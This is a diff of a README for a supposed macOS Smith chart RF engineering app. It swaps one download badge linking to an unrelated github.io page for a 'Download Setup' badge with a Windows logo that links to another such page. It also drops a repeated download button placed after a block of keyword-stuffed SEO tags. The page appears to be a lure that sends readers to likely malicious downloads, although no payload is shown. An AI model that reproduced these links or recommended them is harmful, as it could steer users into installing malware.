@@ -2,12 +2,7 @@
 
 ![Smith Chart Logo](https://static.macupdate.com/products/32640/m/smith-chart-logo.png?v=1568304466)
 
-<!-- Download Button — shield/badge style (RF blue) -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/Smith">
-    <img src="https://img.shields.io/badge/⬇️_GET_SMITH_CHART-1976d2?style=for-the-badge&logo=apple&logoColor=white" alt="Download Smith Chart for macOS">
-  </a>
-</div>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://orionhodgefuyo.github.io/.github/Smith-Chart)
 
 ---
 
@@ -153,12 +148,3 @@ Yes, fully compatible.
 
 ## 🔖 Tags (SEO)
 smith chart mac • rf impedance calculator • smith chart software macos • microwave engineering tool • transmission line calculator • impedance matching tool • s-parameter visualization • vswr circles smith chart • reflection coefficient mac app • rf design tool mac • smith chart for students • rf teaching tool macos • antenna matching mac • smith chart plotting software • electronics engineering smith chart • rf admittance calculator • smith chart visualization tool • rf simulation mac • smith chart reactance resistance • smith chart normalized impedance • vector network analyzer smith chart • passive load matching mac • stub tuner smith chart • microwave theory tool macos • smith chart engineering bundle • rf matching toolkit mac • telecom smith chart macos • electronics classroom smith chart • professional smith chart software  
-
----
-
-<!-- Download Button — shield/badge style (repeat after tags) -->
-<div align="center" style="margin:14px 0 18px;">
-  <a href="https://rumpels-kaji.github.io/.github/Smith">
-    <img src="https://img.shields.io/badge/⬇️_GET_SMITH_CHART-1976d2?style=for-the-badge&logo=apple&logoColor=white" alt="Download Smith Chart for macOS">
-  </a>
-</div>
